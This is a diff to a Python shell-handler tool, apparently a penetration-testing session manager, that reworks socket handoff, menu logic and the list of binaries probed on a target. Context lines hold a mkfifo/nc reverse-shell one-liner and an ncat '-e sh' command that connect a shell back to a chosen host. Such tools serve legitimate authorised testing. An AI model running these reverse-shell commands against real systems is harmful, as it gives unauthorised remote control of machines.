@@ -2139,7 +2139,6 @@ def Connect(host, port):
 		return False
 	_socket = socket.socket()
 	_socket.settimeout(5)
-	handed_off = False
 	try:
 		_socket.connect((host, port))
 		_socket.settimeout(None)
@@ -2153,13 +2152,9 @@ def Connect(host, port):
 		if not core.started:
 			core.start()
 		logger.info(f"Connected to {paint(host).blue}:{paint(port).orange} {EMOJIS['target']}")
-		session = Session(_socket, host, port)
-		if session:
-			handed_off = True
-			return True
-	finally:
-		if not handed_off:
-			_socket.close()
+		threading.Thread(target=Session, args=(_socket, host, port), name=f"NewCon{(host, port)}").start()
+		return True
+	_socket.close()
 	return False
 
 class Forwarding:
@@ -2509,7 +2504,7 @@ class Session:
 					not self.listener and not menu.active.is_set(),
 
 					# Is a bind shell and is spawned from the connect Menu command
-					not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect')
+					#not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect') # Never lands here
 				]
 
 				# If no other session is attached
@@ -2526,6 +2521,8 @@ class Session:
 							menu.show()
 			else:
 				self.kill()
+				if not self.listener and core.attached_session is None and not menu.active.is_set():
+					menu.show()
 				time.sleep(1)
 			return
 
@@ -2794,9 +2791,9 @@ class Session:
 					binaries = [
 						"sh", "bash", "python", "python3", "uname",
 						"tty", "echo", "base64", "wget", "curl", "tar",
-						"rm", "stty", "setsid", "find", "nc",
+						"rm", "stty", "find", "nc", "gzip", "chmod",
 						"tr", "sed", "stat", "awk", "tail", "cut", "df", "id",
-						"cat", "mkfifo", "grep", "mktemp", "gzip", "chmod"
+						"cat", "mkfifo", "grep", "mktemp"
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
@@ -4512,7 +4509,7 @@ class Session:
 				elif self.bin['nc'] and self.bin['sh']:
 					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
 				elif self.bin['sh']:
-					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
+					ncat_cmd = f'{self.bin["sh"]} -c "{{}} -e {self.bin["sh"]} {host} {port} &"'
 					if not (self._ncat and not self.exec(f"test -x {self._ncat} || echo x")):
 						logger.warning("ncat is not available on the target")
 						if self.system == 'Linux' and self.arch == 'x86_64':
